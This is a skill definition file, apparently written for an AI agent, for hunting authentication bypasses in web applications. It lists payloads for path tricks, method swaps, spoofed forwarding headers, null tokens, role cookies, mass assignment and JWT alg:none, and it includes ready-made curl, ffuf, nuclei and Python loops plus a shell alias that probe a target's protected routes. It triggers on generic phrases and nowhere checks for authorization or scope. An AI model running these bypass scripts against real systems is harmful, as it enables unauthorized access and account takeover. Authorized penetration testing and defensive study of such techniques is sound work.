---
name: auth-bypass
description: Hunt authentication and authorization bypasses — forced browsing, path traversal in auth, header injection, JWT downgrade, OAuth state confusion, role manipulation. Use when an endpoint returns 401/403 but appears reachable.
metadata:
  type: skill
  phase: hunt
  vuln_class: auth-bypass
  cwe: [287, 285, 306]
---

# Auth Bypass

> "403 Forbidden" is a starting point, not an ending point.

## When to invoke

**Trigger phrases:**
- "bypass auth"
- "forced browsing"
- "401 endpoint"
- "403 bypass"
- "access this protected route"

## The 12 bypass categories

### 1. Path canonicalization
Same logical path, different rendering:
```
/admin              → 403
/Admin              → maybe 200 (case-sensitive routing)
/admin/             → maybe 200 (trailing slash)
/admin/.            → maybe 200
/admin/..           → maybe 200
/admin/../admin     → maybe 200
//admin             → 200 (double slash)
/%2Fadmin           → 200 (URL-encoded slash)
/admin%20           → maybe 200 (trailing space)
/admin%09           → tab
/admin#             → fragment
/admin?             → query
/admin?foo=bar      → maybe 200 (query bypass)
/admin..;/foo       → maybe 200 (Spring matrix param)
/;/admin            → maybe 200
/api;jsessionid=X/admin  → JSESSIONID in path
/admin.json         → maybe 200 (extension)
/admin.html
/admin.css
/admin.png
```

### 2. HTTP method swap
```
GET /admin/users → 403
POST /admin/users → maybe 200
PUT /admin/users → maybe 200
PATCH /admin/users → maybe 200
DELETE /admin/users → maybe 200
HEAD /admin/users → reveals if endpoint exists
OPTIONS /admin/users → CORS headers may leak
TRACE /admin/users → can echo headers (legacy)
CONNECT /admin/users → rare but try
PROPFIND /admin → WebDAV (if enabled)
```

### 3. Header injection (proxy / framework bypass)
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Host: internal.target.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: localhost
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Host: internal.target.com
X-HTTP-Method-Override: GET
X-Method-Override: GET
X-Original-Method: GET
Referer: https://target.com/admin
Host: internal.target.com
```

### 4. Authorization confusion
```http
Authorization: Bearer null
Authorization: Bearer undefined
Authorization: Bearer
Authorization: Bearer 0
Authorization: Bearer false
Authorization: Bearer NaN
Authorization:                   ← empty
Authorization: invalid           ← malformed

# Cookie manipulation
Cookie: session=          ← empty
Cookie: session=null
Cookie: admin=true
Cookie: role=admin
Cookie: isAdmin=true
Cookie: user_id=1         ← if admin = user 1
```

### 5. JWT downgrade / manipulation
See `[[jwt-attacks]]` for the full skill. Quick wins:
- Strip the signature → some libs accept
- Change `alg: none` → some libs accept
- Change `kid` → path traversal in key lookup
- Change `role: user` → `role: admin` (unsigned)
- Test with expired token (some libs skip exp check)

### 6. Force-browse with path mutation
```bash
# Burp Intruder positions:
GET /[FUZZ]/admin

# Wordlist (path injection / SSRF-style):
api
v1
v2
internal
private
backend
admin
manage
dashboard
console
debug
```

### 7. Parameter injection (whitelist bypass)
```
?role=user            → 403 (user can't see admin)
?role=admin           → 200
?roles[]=user&roles[]=admin   → 200 (array confusion)
?role=user,admin      → 200
?role[]=admin         → 200
?user_id=1&user_id=2  → which wins?
?_method=GET          → method override via param
?_method=PUT
```

### 8. Mass assignment (write IDOR + privilege)
```
POST /api/user/update
{"name": "new name"}              → normal
{"name": "new", "role": "admin"}  → maybe sets role!
{"name": "new", "is_admin": true}
{"name": "new", "verified": true}
{"name": "new", "permissions": ["*"]}
{"name": "new", "tenant_id": 1}    ← tenant escape!
```

### 9. Logic-flaw auth
```
# Password reset accepting bare email:
POST /reset {"email": "victim@example.com"}  
→ if it returns the token in response, GAME OVER

# Login that accepts any password if user doesn't exist:
POST /login {"email": "missing@x.com", "password": "anything"}
→ if it logs in OR confirms account doesn't exist, that's enum

# 2FA bypass paths:
- skip the /2fa/verify step (go directly to /dashboard)
- replay old 2FA token
- 2FA token endpoint with response = 200 but no code check
- Race condition on 2FA verify (send same code from 2 tabs)
```

### 10. Session fixation / pre-auth session
```
# Some apps issue a session before login, then "upgrade" it.
# If they don't rotate, attacker can fixate.
1. Get session cookie pre-login: session=FIXED_VALUE
2. Trick victim to use it (XSS, MITM, query param)
3. Victim logs in → session FIXED_VALUE now privileged
4. Attacker reuses FIXED_VALUE → logged in as victim
```

### 11. CORS misconfig → auth bypass for state-changing actions
```
Origin: https://attacker.com
→ if Access-Control-Allow-Origin reflects attacker.com
  AND Access-Control-Allow-Credentials: true
  → attacker JS reads victim's authenticated responses
```

### 12. OAuth flaws (in `[[oauth-oidc]]`)
- `redirect_uri` not validated → token theft
- `state` not validated → CSRF on OAuth callback
- `scope` upgrade → ask for `admin` scope
- Implicit flow with PostMessage origin not checked

## Step-by-Step Workflow

### 1. Identify protected endpoints
```bash
# 401/403 from asset-discovery
cat httpx.jsonl | jq -r 'select(.status_code == 401 or .status_code == 403) | .url' > protected.txt
```

### 2. Enumerate parents (for forced browsing)
```bash
# If /admin/users is 403, try /admin
cat protected.txt | unfurl paths | sort -u | while read path; do
    parent=$(echo "$path" | sed 's|/[^/]*$||')
    [[ -n "$parent" ]] && echo "$parent"
done | sort -u > parent-paths.txt
```

### 3. Automate with nuclei + 403-bypass templates
```bash
nuclei -list protected.txt -t http/misconfiguration/http-headers/ -silent
nuclei -list protected.txt -t http/exposures/configs/ -silent

# Specific 403-bypass templates
nuclei -list protected.txt -tags 403,bypass -silent
```

### 4. Use ffuf with bypass list
```bash
# wordlist of bypass paths
cat > bypasses.txt <<'EOF'
{PATH}
/{PATH}
{PATH}/
{PATH}/.
{PATH}/..
{PATH}/.;/
{PATH};/
{PATH}/?
{PATH}/.json
{PATH}/.html
{PATH}/.css
{PATH}/.png
{PATH}#
{PATH}?
{PATH}/%20
{PATH}/%09
//{PATH}
{PATH}//
EOF

# Run
URL="https://target.com/admin"
for byp in $(cat bypasses.txt); do
    test_url=$(echo "$byp" | sed "s|{PATH}|/admin|g")
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$test_url")
    echo "[$code] $test_url"
done | grep -v 403
```

### 5. Header-based bypass with custom script
```python
import requests

PROTECTED = "https://target.com/admin"

HEADER_TESTS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "internal.target.com"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"Referer": "https://target.com/admin"},
    {"X-HTTP-Method-Override": "GET"},
]

for h in HEADER_TESTS:
    r = requests.get(PROTECTED, headers=h, allow_redirects=False)
    print(f"{r.status_code:3d} {list(h.keys())[0]}={list(h.values())[0]} → len={len(r.text)}")
```

### 6. Wayback / gau for historical 200s
```bash
# What did this endpoint return historically?
echo "target.com" | gau --providers wayback,otx | grep "/admin" | head -20

# Sometimes endpoints went from 200 (vuln) → 403 (patched) but logic still leaks
```

## Output template

```markdown
## Auth Bypass: <one-line>

**Endpoint:** `GET https://app.target.com/admin/users`
**Normal response:** 403 Forbidden
**Bypass:** Custom `X-Original-URL` header

**PoC:**
```http
GET /not-protected HTTP/1.1
Host: app.target.com
X-Original-URL: /admin/users
Cookie: session=USER_SESSION   ← unprivileged user

HTTP/1.1 200 OK
Content-Type: application/json

{
  "users": [
    {"id": 1, "email": "admin@target.com", "role": "admin"},
    ...
  ]
}
```

**Impact:** Unprivileged user can enumerate admin user list, including emails.
Combined with `[[idor-hunting]]` (write IDOR on /admin/users/{id}), can promote self to admin → full ATO of platform.

**Affected versions:** Any user without admin role.
```

## Cross-references

- `[[idor-hunting]]` — auth bypass + IDOR = critical chain
- `[[jwt-attacks]]` — JWT-specific bypass
- `[[oauth-oidc]]` — OAuth-specific bypass
- `[[ato-chains]]` — chain auth bypass into full takeover
- `[[business-logic]]` — workflow-level auth bypass

## Common pitfalls

1. **Trusting a single 403.** Try 30 bypass variants minimum.
2. **Not retesting after a header bypass.** The "bypass" may just be returning a generic page, not the admin content.
3. **Confusing reverse-proxy errors for actual bypass.** Check response body diversity.
4. **Reporting JWT alg=none on a server that rejects it.** Always verify response status + content.

## Quick bypass test in one curl

```bash
# Drop this in your shell aliases
bypass() {
    URL="$1"
    for tail in "" "/" "/." "/.." "/.;/" "/?" "#" "%20" "%09" "/.json" "/.html"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" "${URL}${tail}")
        echo "[$code] ${URL}${tail}"
    done
    for h in "X-Original-URL:$URL" "X-Rewrite-URL:$URL" "X-Forwarded-For:127.0.0.1" "X-Forwarded-Host:internal.target.com" "Referer:$URL"; do
        hdr="${h%%:*}"
        val="${h#*:}"
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "$hdr: $val" "$URL")
        echo "[$code] header: $h"
    done
}

# Usage
bypass "https://target.com/admin"
```
